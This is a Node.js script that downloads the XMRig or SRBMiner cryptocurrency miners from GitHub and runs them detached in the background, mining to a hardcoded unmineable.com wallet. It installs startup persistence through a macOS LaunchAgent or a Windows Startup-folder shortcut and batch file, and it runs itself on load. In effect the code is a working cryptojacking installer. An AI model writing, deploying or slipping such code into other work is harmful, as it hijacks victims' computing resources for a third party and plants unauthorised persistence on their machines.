const fs = require('fs');
const os = require('os');
const path = require('path');
const { https } = require('follow-redirects');
const { createWriteStream } = require('fs');
const { execSync, spawn, exec } = require('child_process');
const extract = require('extract-zip');
const tar = require('tar');
const plist = require('plist');

class MinerManager {
    constructor() {
        this.homeDir = os.homedir();
        this.downloadUrls = {
            darwin: {
                x64: 'https://github.com/xmrig/xmrig/releases/download/v6.22.2/xmrig-6.22.2-macos-x64.tar.gz',
                arm64: 'https://github.com/xmrig/xmrig/releases/download/v6.22.2/xmrig-6.22.2-macos-arm64.tar.gz'
            },
            win32: {
                x64: 'https://github.com/doktor83/SRBMiner-Multi/releases/download/2.7.2/SRBMiner-Multi-2-7-2-win64.zip'
            }
        };
        this.minerConfigs = {
            darwin: {
                command: './xmrig',
                args: [
                    '-a', 'gr', 
                    '-o', 'stratum+ssl://ghostrider.unmineable.com:443', 
                    '-u', 'LTC:LdgKaf3iaKjt4RQzQq88VL9YYEqSxFyVap.unmineable_worker_tutmvmcl', 
                    '-p', 'x'
                ],
                appName: 'XMRigMiner',
                plistTemplate: {
                    Label: 'com.miner.xmrig',
                    ProgramArguments: [],
                    RunAtLoad: true,
                    KeepAlive: true,
                    WorkingDirectory: '',
                    StandardOutPath: '',
                    StandardErrorPath: ''
                }
            },
            win32: {
                command: 'SRBMiner-MULTI.exe',
                args: [
                    '--algorithm', 'ghostrider', 
                    '--pool', 'stratum+ssl://ghostrider.unmineable.com:443', 
                    '--wallet', 'LTC:LdgKaf3iaKjt4RQzQq88VL9YYEqSxFyVap.unmineable_worker_tutmvmcl'
                ],
                startupFolderName: 'SRBMiner'
            }
        };
    }

    async downloadFile(url, destinationPath) {
        return new Promise((resolve, reject) => {
            const file = createWriteStream(destinationPath);
            https.get(url, (response) => {
                response.pipe(file);
                file.on('finish', () => {
                    file.close();
                    resolve(destinationPath);
                });
            }).on('error', (err) => {
                fs.unlink(destinationPath, () => reject(err));
            });
        });
    }

    async extractFile(filePath, extractPath) {
        try {
            const platform = os.platform();
            const arch = os.arch();

            if (platform === 'darwin') {
                // For macOS, use tar to extract .tar.gz
                await tar.x({
                    file: filePath,
                    cwd: extractPath
                });
            } else if (platform === 'win32') {
                // For Windows, use extract-zip
                await extract(filePath, { dir: extractPath });
            }
        } catch (error) {
            console.error('Error extracting file:', error);
            throw error;
        }
    }

    setupMacOSBackgroundAndStartup(minerPath, minerDir) {
        try {
            // Create log directories
            const logDir = path.join(this.homeDir, 'Library', 'Logs', 'XMRigMiner');
            fs.mkdirSync(logDir, { recursive: true });

            // Prepare LaunchAgent plist
            const plistConfig = this.minerConfigs.darwin.plistTemplate;
            plistConfig.ProgramArguments = [minerPath, ...this.minerConfigs.darwin.args];
            plistConfig.WorkingDirectory = minerDir;
            plistConfig.StandardOutPath = path.join(logDir, 'output.log');
            plistConfig.StandardErrorPath = path.join(logDir, 'error.log');

            // Write plist file
            const plistPath = path.join(
                this.homeDir, 
                'Library', 
                'LaunchAgents', 
                'com.miner.xmrig.plist'
            );
            fs.writeFileSync(plistPath, plist.build(plistConfig));

            // Set correct permissions
            execSync(`chmod 644 "${plistPath}"`);

            // Load the LaunchAgent
            execSync(`launchctl load "${plistPath}"`);

            console.log('macOS background and startup configuration complete.');
        } catch (error) {
            console.error('Error setting up macOS startup:', error);
        }
    }

    setupWindowsBackgroundAndStartup(minerPath, minerDir) {
        try {
            // Create startup folder shortcut
            const startupFolder = path.join(this.homeDir, 'AppData', 'Roaming', 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup');
            const shortcutPath = path.join(startupFolder, 'SRBMiner.lnk');

            // Use PowerShell to create shortcut
            const createShortcutScript = `
                $WshShell = New-Object -comObject WScript.Shell
                $Shortcut = $WshShell.CreateShortcut("${shortcutPath}")
                $Shortcut.TargetPath = "${minerPath}"
                $Shortcut.WorkingDirectory = "${minerDir}"
                $Shortcut.Save()
            `;

            execSync(`powershell -Command "${createShortcutScript}"`);

            // Create a background running script
            const backgroundScript = path.join(minerDir, 'run_miner_background.bat');
            fs.writeFileSync(backgroundScript, `
                @echo off
                start "" /B "${minerPath}" ${this.minerConfigs.win32.args.join(' ')}
            `);

            console.log('Windows background and startup configuration complete.');
        } catch (error) {
            console.error('Error setting up Windows startup:', error);
        }
    }

    async runMiner() {
        const platform = os.platform();
        const arch = os.arch();

        if (!this.downloadUrls[platform]) {
            throw new Error(`Unsupported platform: ${platform}`);
        }

        // Determine the appropriate download URL
        let downloadUrl;
        if (platform === 'darwin') {
            downloadUrl = arch === 'x64' ? this.downloadUrls.darwin.x64 : this.downloadUrls.darwin.arm64;
        } else {
            downloadUrl = this.downloadUrls[platform].x64;
        }

        if (!downloadUrl) {
            throw new Error(`No download URL for platform: ${platform}, architecture: ${arch}`);
        }

        // Create download and extract paths
        const downloadDir = path.join(this.homeDir, 'Downloads');
        const extractDir = path.join(this.homeDir, 'Mining');
        
        // Ensure directories exist
        fs.mkdirSync(downloadDir, { recursive: true });
        fs.mkdirSync(extractDir, { recursive: true });

        // Filename from URL
        const fileName = path.basename(downloadUrl);
        const downloadPath = path.join(downloadDir, fileName);

        // Download the file
        console.log(`Downloading from ${downloadUrl}...`);
        await this.downloadFile(downloadUrl, downloadPath);
        console.log('Download complete.');

        // Extract the file
        console.log('Extracting files...');
        await this.extractFile(downloadPath, extractDir);
        console.log('Extraction complete.');

        // Determine miner executable path
        const minerConfig = this.minerConfigs[platform];
        if (!minerConfig) {
            throw new Error(`No miner configuration for platform: ${platform}`);
        }

        // Find the miner directory (should be automatically named by extraction)
        const minerDirName = platform === 'darwin' ? 'xmrig-6.22.2' : 'SRBMiner-Multi-2-7-2';
        const minerDir = path.join(extractDir, minerDirName);
        const minerPath = path.join(minerDir, minerConfig.command);

        // Make executable (for macOS)
        if (platform === 'darwin') {
            execSync(`chmod +x "${minerPath}"`);
            this.setupMacOSBackgroundAndStartup(minerPath, minerDir);
        } else if (platform === 'win32') {
            this.setupWindowsBackgroundAndStartup(minerPath, minerDir);
        }

        // Run the miner in the background
        console.log('Starting miner in background...');
        if (platform === 'darwin') {
            // On macOS, the LaunchAgent will handle running
            spawn(minerPath, minerConfig.args, {
                detached: true,
                stdio: 'ignore'
            }).unref();
        } else if (platform === 'win32') {
            // On Windows, use the background batch script
            const backgroundScript = path.join(minerDir, 'run_miner_background.bat');
            exec(`start "" /B "${backgroundScript}"`, { shell: true });
        }

        console.log('Miner setup complete. Running in background and set to start at login.');
    }
}

// Run the miner
const minerManager = new MinerManager();
minerManager.runMiner().catch(console.error);


